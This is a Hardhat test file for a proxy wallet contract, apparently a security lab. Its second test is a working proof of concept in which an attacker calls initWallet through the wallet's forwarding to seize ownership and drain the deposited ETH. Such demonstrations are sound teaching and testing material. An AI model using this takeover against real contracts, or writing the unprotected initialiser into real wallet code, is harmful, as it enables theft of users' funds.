const { expect } = require("chai")

describe("Wallet contract", function () {

    let wallet
    let walletLibrary
    let deployer
    let attacker

    const ONE_ETH = ethers.utils.parseEther("1.0")
    const ZERO_ETH = ethers.utils.parseEther("0.0")
    const HUNDREDTH_OF_AN_ETH = ethers.utils.parseEther("0.01")
    const iface = new ethers.utils.Interface(["function deposit()", "function initWallet(address)"])
    
    beforeEach(async function () {
        ;[deployer, attacker] = await ethers.getSigners()
        walletLibraryFactory = await ethers.getContractFactory("WalletLibrary")
        walletLibrary = await walletLibraryFactory.deploy()
        await walletLibrary.deployed()
        walletFactory = await ethers.getContractFactory("Wallet")
        wallet = await walletFactory.deploy(walletLibrary.address)
        await wallet.deployed()
    })

    it("Deployer should be able to deposit and withdraw funds", async function () {

        //deposit 1 eth in wallet
        const txData = iface.encodeFunctionData("deposit", [])
        const tx = await deployer.sendTransaction({
            to: wallet.address,
            value: ONE_ETH,
            data: txData
        });
        await tx.wait()

        //check the 1 eth is in the wallet now
        expect(await wallet.getBalance()).to.be.closeTo(ONE_ETH, HUNDREDTH_OF_AN_ETH)

        //now check we can withdraw it again, first see how much we have now
        let deployerBalanceBefore = await ethers.provider.getBalance(deployer.address)

        //next withdraw the 1 eth from the wallet
        await wallet.withdraw(ethers.utils.parseEther("1"))

        //check that we now have approx 1 eth more than we did before the withdrawal
        let deployerBalanceAfter = await ethers.provider.getBalance(deployer.address)
        let balanceDiff = deployerBalanceAfter.sub(deployerBalanceBefore)
        expect(balanceDiff).to.be.closeTo(ONE_ETH, HUNDREDTH_OF_AN_ETH)

        //finally check the balance of the wallet went back to zero
        expect(await wallet.getBalance()).to.equal(ZERO_ETH)
    })

    it("Unfortunately the attacker can also withdraw funds", async function () {

        //deposit 1 eth in wallet
        let txData = iface.encodeFunctionData("deposit", [])
        let tx = await deployer.sendTransaction({
            to: wallet.address,
            value: ONE_ETH,
            data: txData
        });
        await tx.wait()

        //check the 1 eth is in the wallet now
        expect(await wallet.getBalance()).to.be.closeTo(ONE_ETH, HUNDREDTH_OF_AN_ETH)

        //attacker can't withdraw funds from the wallet yet
        await expect(wallet.connect(attacker).withdraw(ethers.utils.parseEther("1"))).to.be.revertedWith("Only Owner")

        //but they can sieze ownership
        txData = iface.encodeFunctionData("initWallet", [attacker.address])
        tx = await deployer.sendTransaction({
            to: wallet.address,
            data: txData
        });
        await tx.wait()

        //now check attacker can withdraw funds, first see how much they have now
        let attackerBalanceBefore = await ethers.provider.getBalance(attacker.address)

        //next withdraw the 1 eth from the wallet
        await wallet.connect(attacker).withdraw(ethers.utils.parseEther("1"))

        //check that the attacker has approx 1 eth more than they did before the withdrawal
        let attackerBalanceAfter = await ethers.provider.getBalance(attacker.address)
        let balanceDiff = attackerBalanceAfter.sub(attackerBalanceBefore)
        expect(balanceDiff).to.be.closeTo(ONE_ETH, HUNDREDTH_OF_AN_ETH)

        //finally check the balance of the wallet went back to zero
        expect(await wallet.getBalance()).to.equal(ZERO_ETH)
    })

})
